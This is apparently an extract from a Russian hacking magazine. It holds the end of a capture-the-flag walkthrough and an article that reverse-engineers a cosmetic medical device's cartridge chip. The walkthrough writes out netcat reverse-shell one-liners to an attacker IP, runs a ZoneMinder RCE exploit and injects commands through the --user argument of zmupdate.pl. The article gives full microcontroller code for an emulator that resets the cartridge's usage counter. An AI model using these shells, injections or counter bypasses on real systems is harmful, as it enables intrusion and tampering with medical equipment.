Запускаем  листенер  pwncat-cs  -lp  4321  и  выполняем  следующий
реверс-шелл. Это нуж но для получения ста биль ной сессии на удаленном хос-
те.


rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.
16.121 4321 >/tmp/f





                       Соз данная сессия


ÏÐÎÄÂÈÆÅÍÈÅ

Ïîëüçîâàòåëü Matthew
Так как на сервере работа ет целая CMS, первым делом поищем учетные дан-
ные, которые могут помочь в продвижении. В данном слу чае в каталоге CMS
находим резервную копию базы данных.





                  Со держимое катало га CMS

Возможнос ти pwncat позволяют скачать файл. Для этого комбинацией кла-
виш Ctrl-D перехо дим в основное меню pwncat, командой download ска чива-
ем файл, после чего командой back возвра щаемся обратно в тер минал сес-
сии.





                           Загрузка файла

В скачанном архи ве при сутс твует только сырой дамп SQL.





                   Со держимое ZIP-архива

Файл очень большой, откроется не любым редак тором, поэтому просто
поищем по словам вроде password. Именно так находим таблицу users.
Дальнейший поиск вставки данных в таб лицу users дал всего одну запись,
в которой при сутствует хеш пароля пользовате ля.





                   Содержимое SQL-файла

Для опре деления алгоритма хеширования можно воспользоваться утилитой
hashid.





              Определение алго ритма хеширо вания

Са мый популяр ный из представленных алгоритмов хеширования — это SHA-
256. Попробовать  най ти  прообраз  хеша мож но  в  онлайновой  базе
md5decrypt.net.





                      Результат взло ма хеша

У нас есть пароль, теперь получим спи сок активных пользователей из файла /
etc/passwd.




                     Поль зователи с кон солью

С полученными учетными данными авторизу емся по SSH от име ни поль-
зователя matthew.





                       Флаг пользователя


Ïîëüçîâàòåëü ZoneMinder
Те перь нам необходимо собрать информа цию. Мест, где в Linux может ока-
заться что-то инте рес ное, очень много, поэтому луч ше всего применить авто-
мати зацию. Я, как обычно, воспользуюсь для этого скриптом из набора
PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.



Заг рузим на хост скрипт для Linux, дадим пра во на выполнение и запустим
сканиро вание. В выводе будет много информа ции, поэто му ищем самое важ-
ное.
  Для локального хоста открыт порт 8080, который отвечает за какой-то
веб-сервис.





                           Активные пор ты

Под робнее о том, что это за сайт, мы можем узнать из настро ек веб-сервера
Nginx. Давай заг лянем в файл /etc/nginx/sites-enabled.





                        Нас трой ки Nginx

А в фай ле окружения Craft /var/www/html/craft/.env нашелся пароль
от базы данных Craft.





                   Со держимое файла .env

В исходном коде ZoneMinder при сутству ет пароль для базы дан ных —
ZoneMinderPassword2023.





                Содержимое файла database.php

Пос коль ку ZoneMinder нас троен так, что бы обращать ся к нему можно было
только с локального хос та, для доступа нам потребуется туннелировать тра-
фик. Сде лать это мож но при помощи ssh:


ssh matthew@surveillance.htb -L 8080:127.0.0.1:8080

Таким образом, весь тра фик, который мы пош лем на локальный порт 8080,
будет  тун нелирован  на  порт  8080  ука занного  хос та  (в  данном  слу-
чае 127.0.0.1) через SSH-хост. Теперь подклю чаем ся к пор ту.





                       Страница ZoneMinder

В исходном коде ZoneMinder можно най ти версию сервиса.


cd /usr/share/zoneminder/www/api/app/Config
grep -iR version ./



                      Версия ZoneMinder

Узнали вер сию про дукта — сра зу идем искать экспло иты.





             Поиск эксплоитов для ZoneMinder в Google

Первая же ссылка ведет  к эксплоиту для уязвимости CVE-2023-26035.
Текущая версия ZoneMinder неправильно проверяет раз решения и парамет-
ры через функцию shell_exec, что мож но использовать для удаленного
исполне ния кода без авторизации.
  Давай для тес та под нимем веб-сервер на Python:


python3 -m http.server 80

А теперь через экс плоит обра тим ся к нему с помощью curl.


python3 poc.py --target http://127.0.0.1:8080/ --cmd 'curl 10.10.16.
121/test_rce'





                   Выполнение экс плоита





                      Ло ги веб-сервера

Ко ман да выпол няется успешно, и мы получа ем обра щение к нашему сер веру.
Значит, можем получить и реверс-шелл.




Об ратный шелл — это подклю чение, которое активиру ет атакуемая машина,
а мы принимаем и таким образом подключаем ся к ней, чтобы выполнять
коман ды от лица поль зователя, запустивше го шелл. Для приема соеди нения
необходимо создать на локальной машине listener, то есть «слу шатель».



Запускаем листенер:


pwncat-cs -lp 4321

И через эксплоит выполняем одностроч ник на Bash, который и даст нам бэк-
коннект.


python3 poc.py --target http://127.0.0.1:8080/ --cmd 'rm /tmp/f;
mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.16.121 4321
>/tmp/f'





                 Сессия пользователя ZoneMinder


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

Пол ную разведку в системе мы уже проводи ли на пре дыду щем этапе, поэто-
му при сме не пользователя нам нужно переп роверить лишь несколько мест.
Первое из них — настройки sudoers.


sudo -l





                       Настройки sudoers




Файл /etc/sudoers в Linux содержит спис ки команд, которые разные группы
поль зовате лей могут выполнять от имени администратора системы. Можно
прос мотреть его как напрямую, так и при помощи команды sudo -l.



Мы можем в при виле гированном контек сте запускать какие-то скрипты
на Perl, входящие в ZoneMinder. Просмотрим все скрипты, удовлетворяющие
маске из команды в sudoers.





                       Скрипты ZoneMinder

Файл zmupdate.pl содержит уязвимость Command Injection. Она воз можна
из-за неп равильной обработ ки переда ваемого скрип ту имени пользовате ля
в параметре --user. Полученная строка будет без обработ ки вставлена
в команду mysql.





                   Исходный код zmupdate.pl

Для провер ки уязвимости можно выполнить команду id, а ее вывод записать
в файл.


sudo /usr/bin/zmupdate.pl --version= 1 --user='$(id > /tmp/test_lpe)'
--pass=ZoneMinderPassword2023





                     Про верка уяз вимос ти

Скрипт даже выводит коман ду mysql, которую выполняет. В файле присутс-
твует вывод нашей id, а значит, можно запус тить листенер и сразу выпол нить
реверс-шелл.


sudo /usr/bin/zmupdate.pl --version= 1 --user='$(rm /tmp/f; mkfifo /
tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.16.121 5432 >/tmp/f)
' --pass=ZoneMinderPassword2023





                           Флаг рута

Нам удалось подключиться от имени рута, а значит, машина захвачена!
ТРЮКИ





В этой статье я рас скажу, как про исходит
реверс-инжиниринг  реаль ного  медицин-
ского обо рудо вания. На примере картрид-
жа для аппарата Liposonix мы разберем
базовые приемы обратной разработ ки про-                 exits                                                                                    Профессионально
токо лов цифровых устройств и пос мотрим,         занимаюсь ремонтом                                                                                        электронной техники
как мож но под делать передаваемые дан-         4d.41.49.4c@gmail.com
ные.  Оказалось,  что ими тировать  ори-
гиналь ный кар тридж мож но при помощи
обыч ного мик роконтроллера ATmega.


Кос метологический аппарат Liposonix предназна чен для коррекции фигуры
методом ультразвукового воздействия. Эта про цеду ра, изначаль но раз-
работанная американской компани ей Solta Medical, широко распростра-
нилась в нашей стране после появления на рынке относитель но дешевых
китайских кло нов обо рудо вания. При этом само название Liposonix стало
име нем нарицательным и для процедуры, и для аппаратов такого типа.
  С одним из китай ских клонов Liposonix мы сегод ня и будем работать. Он
оснащается сен сорным экраном, нуж ным для задания параметров про цеду-
ры, и манипулято ром с кнопкой акти вации, к которому подсоеди няет ся смен-
ный картридж.





   Фото со страницы одно го из продавцов на китайском мар кетплейсе

Картридж, в свою оче редь, содержит ультразвуковой излучатель, герметич-
ный, запол ненный жидкостью резервуар из упругого матери ала, играющий
роль линзы, и плату с чипом. С ней-то мы и будем работать в этой статье.





Картриджи различаются некой «глубиной», которая может варьиро ваться
от 0,6 до 1,8 см. Посколь ку я не косметолог, не могу объяснить, что именно
под этим подразумевается, могу лишь предположить, что картриджи с разной
глубиной имеют разную конфигура цию лин зы.
   Как мож но понять из конс трукции, никаких расходу емых материалов в кар-
тридже нет. В теории картридж работос пособен до тех пор, пока не вый дет
из строя излучатель, однако производитель не упустил возможность реали-
зовать модель цено образования бритва — лез вие, всем нам известную
по собственно бритвам и картриджам для принтеров. Помимо значения глу-
бины, чип картриджа содер жит также счетчик импульсов. По мере работы
импульсы расходу ются, и, ког да они кон чатся, аппарат заб локируется.
  При под соеди нении нового картриджа аппарат считыва ет параметры
и отоб ражает их на своем дисплее:  глубина, общее число импульсов
(емкость кар триджа) и их дос тупный остаток. Итак, наша задача — найти спо-
соб повторно го использования картриджей, исчерпавших свой счетчик.


ÎÑÌÎÒÐ

Любое иссле дова ние начинается с осмотра. Извлекаем плату с чипом из кар-
триджа и внимательно изучаем на предмет мар кировок, логотипов и все го
про чего, что можно вбить в Google. К сожалению, в нашем случае никаких
полез ных надписей обнаружить не удалось.
  Сам чип — микросхема в корпусе SO-8, повер хность затерта абразивом
для удаления заводских маркировок. Тем не менее контактные площадки пла-
ты под писаны: 5V, GND, SCL, SDA. Вооружив шись карандашом и мультимет-
ром, вос становим схе му, благо она — про ще некуда.





Схе ма включения (под тяжка линий данных к питанию резис торами R1 и R2)
указывает на то, что по умолчанию линии находят ся в высоком состоянии (idle
high). Это наб людение наряду с сок ращени ями SCL и SDA с ходу намекает
нам на интерфейс I2C.
  Ши роко распространенные мик росхемы памяти EEPROM серии 24 как раз
работа ют по I2C! Неслучай ное совпадение? Впрочем, посмотрев на первый
попавший ся даташит этой серии  (PDF), видим отличие в рас положении
выводов: у нашей микросхемы питание пода ется на второй вывод, а у 24-й
серии — на восьмой.
  Попыта ем  счастья,  подклю чив  программа тор,  но  микросхема,  увы,
не читается. Поиск в каталогах других мик росхем памяти, работающих по I2C,
с подходящим расположением выводов также ни к чему не при вел. Что ж,
ожи даемо: учитывая, сколько существует элек тронных компонентов, такая
идея сле пого перебо ра вручную изна чально не особенно жиз неспособна.
  Отбро сив ока зав шееся тупиковым предположе ние, вос пользуемся дру гим
методом анализа: перехватим обмен дан ными между картриджем и аппа-
ратом.


ÏÅÐÅÕÂÀÒ ÄÀÍÍÛÕ

С этой опе рацией нам поможет логичес кий анализатор — устройство,
записы вающее и отобража ющее цифровые сигналы. Анализаторов существу-
ет великое множество, но за пределами профес сиональных лабораторий,
в сре де энтузиастов весьма популярны USB-анализаторы американской фир-
мы Saleae. Цены на фирменные устройства начинаются с 500 долларов,
однако, вбив название про изводителя в поиск на любом маркетплейсе, уви-
дим мно жество недорогих копий.
  При этом программу ана лиза сигналов (Logic) можно скачивать с сайта
Saleae без каких-либо огра ничений. Сейчас дос тупна Logic 2, однако, на мой
взгляд, первая версия работа ет быстрее и ста бильнее. Программа портатив-
ная, не требует установки; драй веры устрой ства находятся в том же архи ве
вместе с программой.
  Подключим входы анализа тора к контактам SCL и SDA. Не забудем соеди-
нить землю иссле дуемой платы с землей анализатора через соответс тву-
ющий  вывод, иначе  ничего не заработает. Под соединяем анализатор
к компьюте ру, а плату картриджа — к разъ ему в манипулято ре аппарата. Пос-
ле это го, запустив Logic, нажимаем большую зеленую кнопку Start и вклю чаем
питание аппарата.




Разность потенциалов на шинах данных, накоп ленный статический заряд
и кривая электропровод ка в помещении могут приводить к нежелатель ным
эффектам при подключении устрой ств: от появления фантомных сигналов,
шумов и наводок вплоть до выгорания ком понентов. Старайся при держивать-
ся как минимум этих базовых правил:
 • Убе дись, что контакты заземления во всех розетках имеют одинако вый
   потенциал, а еще лучше — подключай компьютер, иссле дуемое устрой-
   ство и изме рительные приборы в одну розет ку через удлинитель.
 • Сначала соедини все схемные зем ли устройств и толь ко потом подклю-
   чай ся к лини ям дан ных. Обеспечь надежное соеди нение меж ду землями,
   кон такт не должен отваливать ся при работе.
 • До того как все земли надежно соеди нены, все устройства должны быть
   вык лючены (либо включено только одно из них — обычно это компь ютер),
   схем ная земля USB соеди нена с его корпусом, а корпус — с заземлением
   в розетке питания. Вклю чай устройства только после того, как объ единил
   их зем ли.
 • Определись, что откуда питается, и не соеди няй лишние линии питания.
  В таком случае исследуемая схема будет запита на от аппарата, и подклю-
   чать к ней +5В от порта USB, выведен ные на разъ ем анализатора, не сле-
   дует.



В  Logic видим вклю чение  питания: обе линии данных переключа ются
в высокий уровень. Через четыре секун ды после подачи питания замечаем
некоторую активность на одном из каналов.





Приблизив  изображение,  отчетливо  видим,  что  обнаруженная  нами
активность — не что иное, как передача дан ных.





Пос ле первой посылки данных ничего не происходит. Но, если мы нажмем
на кноп ку манипулято ра, ультраз вуковой излучатель активиру ется и счетчик
импульсов уменьшится. Одновременно мы уви дим обмен на лини ях данных.
Можем повторить нажатия, чтобы убедиться в пов торя емости результатов.





ÄÅÊÎÄÈÐÎÂÀÍÈÅ ÄÀÍÍÛÕ

По дыто жим собранную информа цию. Учитывая логику работы устройства, мы
понимаем, что обмен данными должен быть äâó íàïðàâëåí íûé. В самом
деле, не только кар тридж должен каким-то обра зом передавать информацию
в устройство, но и устройство дол жно сооб щать кар триджу о необходимости
дек ремен та счетчика при нажатии кноп ки на манипуляторе. Это под твержда-
ется и нашими наблюдениями.
  Мы можем заметить, что обмен данными ведется в ïî ëóäóïëåê ñíîì
режиме: в один момент активна только одна линия дан ных, вторая в это время
находится в состоянии по умолчанию (простаивает). В том числе мы видим
отсутс твие внешнего тактового сигнала, то есть интерфейс àñèí õðîí íûé.
  Отметим и то, что каждая линия переда ет дан ные только в одном нап-
равле нии: данные от картриджа к аппа рату передаются по одной, а от аппа-
рата к кар триджу — по дру гой. Наконец, мы видим, что состояние линии
по умолчанию — высокий уро вень.
   Итак, это не I2C, как мы изначально предположили по обозначениям кон-
тактов, ведь в этом случае мы видели бы импуль сы тактирова ния на одной
линии и данные на другой. Зато нашим наблюдениям в полной мере соот-
ветствует пос ледователь ный интерфейс UART. Он как раз асинхрон ный
и исполь зует две линии, одну на прием (RX), другую на передачу (TX).
  В интерфейсе UART высокий уровень линии данных означает 1, низ-
кий 0 и по умолчанию линии находятся в высоком состоянии. Передача дан-
ных начинается переключени ем линии в низкий уро вень — это стар товый бит,
всег да равный нулю. Затем поочередно передаются все биты данных,
которых обычно от 5 до 9. За ними опционально следует бит четности,
используемый  для  контро ля  целостнос ти  дан ных.  Завершает  посылку
стоп-бит (опци онально их может быть два или даже пол тора). Все вмес те эти
биты образуют фрейм — еди ницу переда чи дан ных по интерфейсу.
   Чтобы пра вильно декоди ровать данные, нам нуж но знать конфигурацию
фрей ма: число битов дан ных, наличие бита четности, чис ло стоп-битов. Мы
не знаем этих данных наперед, и их придется угадывать. Общепринята кон-
фигурация 8N1, что означает 8 бит данных, нет бита четности, один стоп-бит.
С нее и начнем.
  Кроме того, необ ходимо знать скорость передачи данных. К счастью, ее
мы можем вычислить без осо бого труда. Прог рамма анализатора позволяет
нам изме рить длительность одного импульса на линии данных. В нашем слу-
чае она составляет 0,1045 мс. Пос коль ку один импульс — один бит, количес-
тво импульсов в  секунде и будет искомой скоростью: 1000/0,1045 ≈
9600 Кбит/с.





                       Табличка с общеупотребительными скоростями
                      передачи и соответству ющими длитель ностями
                       бита


Не пережи вай, нам не потребуется под счи тывать импульсы вручную, перево-
дя их в биты. У Logic есть большой набор встроенных анализаторов, позволя-
ющих  декоди ровать  данные.  Добавим  анализатор  пос ледовательного
интерфейса под названи ем Async Serial и зададим для него вычисленную ско-
рость 9600 Кбит/с, а остальные параметры пока оста вим по умол чанию.





Нам повезло, программа не сообщила об ошибках декодирования, и мы
можем видеть все переданные значения.





Под клю чая картриджи с раз ной глу биной, общим числом и остатком импуль-
сов, соберем данные, отправляемые при подаче питания на картридж и при
нажатии на кнопки манипу лятора, а затем декоди руем полученную информа-
цию. Результат для удобс тва сведем в таб лицу Excel.





ÈÍÒÅÐÏÐÅÒÈÐÓÅÌ ÄÀÍÍÛÅ

Давай про ана лизи руем собранные дан ные. Как видим, обмен осущест вля-
ется пакета ми по 12 байт. Первые два стол бца содержат значения байтов
пакета, отправ ляемо го картриджем после подачи питания (назовем такие
пакеты ини циали зационными). Столбец B содержит пакет, отправленный кар-
триджем с глубиной 0,8 см, емкостью 526 импульсов и остатком в 1 импульс.
Столбец C содер жит пакет, отправленный кар триджем с глу биной 1,3 см,
емкостью 526 импульсов и остатком в 525 импульсов. Столбец E — пакет,
отправ ляемый аппа ратом  в  картридж при спи сании одно го импульса.
Наконец, столбец G — ответ картриджа аппарату после декремента счетчика
импульсов.
  В каж дом пакете можно выделить неизменные голов ную (два байта: 170,
12) и хвостовую (три байта: 12, 204, 51) части. Кро ме того, некоторые байты
в середине пакета тоже никогда не меняют сво их зна чений. Для наглядности
неизменные части пакетов я выделил зеленым.
   Тип пакета опре деляется зна чени ем его третьего бай та. Инициали заци-
онные пакеты несут значение 70 в треть ем байте, команда аппа рата на дек-
ремент счетчика импульсов — 67 и ответ картриджа после ее исполнения —
69. Несложно заметить, что два последних идентичны, кроме собственно
треть его байта.
  Значение пятого байта соот ветс тву ет глубине картрид жа в миллимет рах.
А вот с емкостью и счетчиком немного сложнее. Первый картридж имеет
остаток 1, а второй — 525. Соот ветс твующие столбцы отличаются толь ко
парой бай тов: восьмым и девятым. Соот ветственно, именно они хранят оста-
ток  счет чика. Можем предположить,  что общая емкость картриджа —
это шестой и седьмой байты. Но почему зна чения 2 и 14 дают 526?
   Как известно, один байт может при нимать значения от –128 до 127 (или
от 0 до 255 для беззнаковых чисел). У наших кар трид жей емкость 526 импуль-
сов, и для сохранения это го значения потребу ется два бай та, каждый
из которых будет нести «половинку чис ла». Один из них будет старшим, вто-
рой — млад шим.
  На при мере первого картриджа, где остаток 1, мы можем видеть, что стар-
ший байт в пакете идет перед млад шим. Это называется «порядок от стар-
шего к младшему» (big-endian). Для удобс тва переведем в шес тнадцатерич-
ную систему и проверим на калькуляторе: дей стви тельно, (020E)  = (526)   ,                                                                    16        10
(020D)  = (525)   , ну и, разумеется, (0001)  = (1)   .       16        10                          16     10
   Те перь мы знаем все необходимое для создания собственного чипа,
который сможет ими тировать поведение оригиналь ного, а мы сможем
«записать» в него такую емкость, какую пожелаем.


                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ



        РЕВЕРСИМ КАРТРИДЖ LIPOSONIX
             И ПИШЕМ ЕГО ЭМУЛЯТОР





ÏÈØÅÌ ÝÌÓËßÒÎÐ

Для соз дания эмулято ра я выб рал ATmega168 — прос то потому, что у меня
нашел ся лиш ний экземпляр. Конечно, для столь прос той задачи этот мик-
роконтрол лер избы точен и лучше выб рать что поменьше (но желательно
с аппаратным U(S)ART, что бы не писать прог раммную его реализацию).




                    USART — это UART, работающий в синхронном
                      режиме. В этом случае добавляется отдельная
                       линия  дан ных,  несущая  сигнал  тактирования
                       для син хрониза ции приемника и передатчика, что
                       позволяет под нять ско рость передачи. Как пра-
                         вило, USART спо собен работать и асинхрон но,
                         как UART, но не наоборот.


Оп ределим алгоритм работы нашего эмулятора. Хранить глу бину, емкость
и текущее значение счетчика будем в EEPROM микроконтрол лера. После
включения МК счи тывает эти параметры, формирует и передает через UART
инициализаци онный пакет.
  Данные, принятые через UART, складываются в буфер. В основном цикле
МК ищет в буфере вхо дящую команду (пакет длиной 12 байт со значением
треть его по счету байта рав ным 67). Если она найдена, значение счетчика
устанав ливается таким, какое указано в принятом пакете, и записы вается
в EEPROM, пос ле чего воз вращается пакет-ответ (идентичен входящей
коман де, кро ме треть его бай та).
  Подключим необходимые заголовки:


#include <util/atomic.h>
#include <avr/eeprom.h>

Оп ределим коды возврата функций:


#define ERR (-1)
#define OK  0

Оп ределим функции работы с UART. Сразу оговорюсь, мы не будем сей час
рас сматривать их реали зацию, поскольку это выходит за рамки статьи.
Готовые при меры работы с UART и кольцевым буфером ты найдешь самос-
тоятельно или можешь пос мотреть мою реализацию на GitHub.


/*
 * Отправка отдельного байта через UART.
 * Возвращает ERR, если буфер отправки полон.
 */
int8_t uart_send_byte(uint8_t value);


/*
 * Возвращает число байтов, содержащихся в приемном буфере.
 */
uint8_t uart_get_rx_data_length(void);


/*
 * Удаляет один байт из приемного буфера и возвращает
 * его значение или '\0', если буфер пуст.
 */
uint8_t uart_read_byte(void);

Во избе жание магических чисел в коде определим зна чения, которыми будем
оперировать:


// Размер пакета данных
#define PACKET_LENGTH   12


// Значение первого байта в заголовке пакета
#define PACK_HEAD1      170
// Значение второго байта в заголовке пакета
#define PACK_HEAD2      12


// Тип пакета: инициализационный
#define CMD_INIT        70
// Тип пакета: команда декремента
#define CMD_DECR        67
// Тип пакета: ответ на команду
#define CMD_RESP        69


// Индекс байта, определяющего тип пакета
#define INDEX_OF_CMD    2
// Индекс байта, хранящего значение глубины
#define INDEX_OF_DEPTH  4
// Индекс старшего байта значения емкости
#define INDEX_OF_TOTLH  5
// Индекс младшего байта значения емкости
#define INDEX_OF_TOTLL  6
// Индекс старшего байта значения счетчика
#define INDEX_OF_REMNH  7
// Индекс младшего байта значения счетчика
#define INDEX_OF_REMNL  8

Данные картриджа будем хранить в виде структуры. В нее запишем значения,
получаемые из EEPROM и записы ваемые в него, а также получаемые от аппа-
рата в теле пакета, который сиг нализирует о необ ходимости умень шить счет-
чик. Также опре делим значения по умолчанию, которые будут прис воены
полям  структуры при первом вклю чении  картриджа,  ког да  в EEPROM
еще ничего не записывалось:


// Начальные параметры:
// глубина
#define DEFAULT_DEPTH   120
// емкость
#define DEFAULT_TOTL    526
// остаток
#define DEFAULT_REMN    526


typedef struct {
    uint8_t depth;
    uint16_t total;
    uint16_t remaining;
} parameters_t;

Значения бай тов пакета будем хранить в массиве. Пос кольку мы работаем
в полудуп лек сном режиме, то вполне можем использовать один и тот же мас-
сив и для принимаемых, и для передаваемых пакетов. Инициализируем мас-
сив значениями соот ветс твенно содержанию пакета ори гинального картрид-
жа:


uint8_t packet[PACKET_LENGTH] = {
    PACK_HEAD1, PACK_HEAD2, CMD_INIT, 101, 130, 2, 14, 2, 14, 12, 204
, 51
};

Нам понадобится несколько вспомогательных функций. Во-пер вых, нужна
функция, которая присвоит зна чения бай там пакета в соответс твии с дан-
ными, находящими ся в нашей структуре params. Обрати внимание на раз-
деление одного двухбайтового значения на старший и младший байт. Пре-
образование значения при водит к отбрасыванию старшего бай та, поэтому
для получе ния млад шего мы просто выполняем пре обра зование, а для
получе ния старшего сперва выполняем сдвиг вправо на один байт, что бы
биты стар шего байта встали на место младшего.


static inline void update_packet_from_params(uint8_t* packet, const
parameters_t* params){
    packet[INDEX_OF_DEPTH] = params->depth;
    packet[INDEX_OF_REMNH] = (uint8_t)(params->remaining>>8);
    packet[INDEX_OF_REMNL] = (uint8_t)params->remaining;
    packet[INDEX_OF_TOTLH] = (uint8_t)(params->total>>8);
    packet[INDEX_OF_TOTLL] = (uint8_t)params->total;
}

Еще нам понадобится функция отправки пакета через UART:


static inline void send_packet(const uint8_t* packet){
    for (int i=0; i<PACKET_LENGTH; i++){
        uart_send_byte(packet[i]);
    }
}

Фун кция поиска входящей команды проверя ет дан ные в приемном буфере
UART и, если там действительно содер жится коман да, копиру ет ее в мас сив
packet и возвращает OK. В противном случае воз вра щается ERR.


static inline int8_t get_command(uint8_t* packet){
    // Если в приемном буфере UART достаточно данных,
    // проверим наличие заголовка пакета и в случае
    // успеха скопируем содержимое пакета из буфера
    // в массив packet
    while (uart_get_rx_data_length() >= PACKET_LENGTH){
        int index = 0;
        if (uart_read_byte() != PACK_HEAD1) continue;
        index++;
        if (uart_read_byte() != PACK_HEAD2) continue;
        index++;
        while (index < PACKET_LENGTH){
            packet[index++] = uart_read_byte();
        }
        return OK;
    }
    return ERR;
}

Наконец, функции чтения и записи EEPROM. При чтении данные из EEPROM
помещаем в структуру params, а при записи, наоборот, сохраняем значения
этой структуры в EEPROM.


#define  EE_SETTINGS_ADDR 10


static inline void mem_read_params(parameters_t* params){
    ATOMIC_BLOCK(ATOMIC_RESTORESTATE){
        eeprom_read_block((void*)params, (const void*)
EE_SETTINGS_ADDR, sizeof(parameters_t));
    }
    // Если в EEPROM пусто, использовать значения по умолчанию
    if ((params->depth == 0xFF)||(params->depth == 0)) params->depth
= DEFAULT_DEPTH;
    if (params->remaining == 0xFFFF) params->remaining = DEFAULT_REMN
;
    if (params->total == 0xFFFF) params->total = DEFAULT_TOTL;
}


static inline void mem_write_params(const parameters_t* params){
    ATOMIC_BLOCK(ATOMIC_RESTORESTATE){
        eeprom_update_block((const void*)params, (void*)
EE_SETTINGS_ADDR, sizeof(parameters_t));
    }
}

В основном цикле программы готовим и бесконечно опрашива ем буфер.
Когда в буфере появит ся входящая коман да — выполним ее, сохраним дан-
ные в память и отправим ответ.


// Скорость 9600 Кбит/с (магическое значение берем из документации)
#define BAUDRATE 103


int main(void)
{
    uint8_t packet[PACKET_LENGTH] = {
        PACK_HEAD1, PACK_HEAD2, CMD_INIT, 101, 130, 2, 14, 2, 14, 12,
204, 51
    };
    parameters_t params;
    // Инициализация UART c заданной скоростью
    UBRR0 = BAUDRATE;
    // Асинхронный режим
    UCSR0A = _BV(U2X0);
    // Включить приемник и передатчик,
    // включить прерывание по завершении приема
    UCSR0B = _BV(TXEN0)|_BV(RXEN0)|_BV(RXCIE0);
    // Фрейм 8N1
    UCSR0C = _BV(UCSZ00)|_BV(UCSZ01);
    // Включить Idle mode
    SMCR = _BV(SE);
    // Читаем параметры из EEPROM
    mem_read_params(&params);
    // Присваиваем байтам пакета соответствующие значения
    update_packet_from_params(packet, &params);
    // Разрешаем прерывания
    sei();
    // Отправляем инициализационный пакет
    send_packet(packet);
    // Ждем входящую команду
    while(1){
        if (get_command(packet) == OK){
            // Принят пакет, проверим третий байт — команда ли это
            if (packet[INDEX_OF_CMD] != CMD_DECR) continue;
            // Все в порядке, выполняем:
            // собираем новое значение счетчика из старшего и
младшего байтов
            uint16_t newval = (uint16_t)(packet[INDEX_OF_REMNH]<<8) +
packet[INDEX_OF_REMNL];
            // Счетчик работает только на уменьшение
            if (newval >= params.remaining) continue;
            // Обновляем значение счетчика
            params.remaining = newval;
            update_packet_from_params(packet, &params);
            mem_write_params(&params);
            // Отправляем ответный пакет
            packet[INDEX_OF_CMD] = CMD_RESP;
            send_packet(packet);
        }
        // Спим до возникновения прерывания
        asm("sleep");
    }
}

Для про вер ки наброса ем простенькую схем ку в Proteus.





Пос ле вклю чения видим в терминале пакет, содержащий заданные нами зна-
чения по умолчанию. Можем подклю читься к виртуаль ному COM-пор ту любой
программой-тер миналом, отправить команду на уменьшение счет чика и про-
верить ответ.





                     Для соединения двух COM-портов используется
                      нуль-модемный кабель, под клю чающий RX одно-
                         го порта к TX дру гого и наоборот. Поскольку мы
                    имеем дело с вир туальным портом в Proteus,
                      нуль-модемный кабель тоже потребу ется вир-
                         туальный — com0com.



ÊÀÊ ÇÀÙÈÒÈÒÜÑß

Представим себя разработчиком подоб ной сис темы. Как бы мы могли
защититься от подклю чения поддельных компонентов?
  На физическом уровне раз работчики в таких слу чаях обычно используют
нестандартные конфигура ции приемо передатчиков. Например, задают про-
извольные значения ско рости передачи, количес тва битов данных в фрей ме,
добавляют дополнительные биты четности или кон трольной суммы. Может
быть инверти рован сиг нал (вместо высокого уров ня линии использоваться
низкий и наобо рот) или сдви нуты физические уров ни (величины напряжений
на линии, при нимаемые за 0 и 1). Как таковой дополнительной защиты этот
под ход зачастую не дает, но немного затрудняет вмешательство, поскольку
требует дополнительного времени и технических средств.




Кас томная конфигурация не всегда будет под держиваться аппаратно. Нап-
ример, в ATmega не получится скон фигурировать USART для использования
четырех или, наобо рот, десяти бит данных в фрейме. В таких случаях при-
ходится реали зовывать желаемое прог раммно, по срабаты ванию таймера,
нас троенного на дли тельность одного бита, уста нав ливая логичес кий уро-
вень на выводе GPIO, соответству ющий зна чению передаваемо го бита.
Это называется bit-banging, что мож но вольно перевести как «перестукивание
битами».  Аналогич ным  способом  поступают,  когда  устройство  просто
не содер жит тре буемо го аппа ратного интерфейса, как, например, многие
модели ATtiny.



Манипуляции на физическом уровне — обо юдоострое оружие. Да, перехват
данных в такой сис теме может быть нет ривиаль ным, и эму лировать ее
популярным МК общего назначения тоже может быть непросто. Но и раз-
работ чику системы точно так же потребуются нетривиальные схемотехничес-
кие решения, необычные ком поненты и прог раммная эмуляция вместо аппа-
рат ного приемо пере датчика. Такой метод был относительно популярен
в прошлом, но сей час практически не встре чается.
  Оче видная защита на прог раммном уров не — это, конечно же, шиф-
рование передаваемых данных. Проблема здесь в том, что прос тые подста-
новоч ные и перес тановочные шифры относитель но легко взломать или под-
делать. Действи тельно, в нашем случае на самом деле не так уж важно, пред-
став ляется ли значение счетчика как 0x020E или другим числом, главное —
най ти его в пакете данных и затем вос про извести. В крайнем случае мы
можем просто скли кать счетчик до нуля, на каждом этапе сохраняя соответс-
твующее значение. Более же развитые алго ритмы шифрования, обеспечива-
ющие лавинный эффект достаточной степени, тре буют существенно больше
вычислительных ресурсов, а это под разумевает более мощ ный и дорогой
мик рокон троллер, больше потребле ния энергии, более крупные габариты.




                     Ла вин ный эффект в криптографии выражается
                        в том, что изменение небольшой час ти шиф-
                      руемого сообщения вызывает изменение зна-
                        чительной части шифра. В нашем случае изме-
                      нение величи ны счет чика приводит к изме нению
                      одного,  максимум  двух  байт  передаваемого
                        пакета общей длиной 12 байт. В случае исполь-
                       зования шифрования с выражен ным лавинным
                     эффектом мог ли бы менять ся  6, 8 или даже
                       все 12 байт!


Другой сценарий программной защиты состоит в том, чтобы сперва под твер-
дить под линность одного из участни ков обме на данными (в нашем случае
картрид жа), а уже затем обмениваться данными в открытом или шифрован-
ном виде.
  В качестве при мера рас смот рим рас пространенный в автомобильной
индустрии протокол аутентифика ции Seed-Key. Суть сос тоит в том, что обоим
участни кам соединения известна некото рая секретная математичес кая фун-
кция. При попытке соеди нения сервер передает ини циато ру соединения слу-
чайное значение — seed. Ини циатор соединения преобразовывает это зна-
чение пос редс твом секретной функции. Результат пре образования — key —
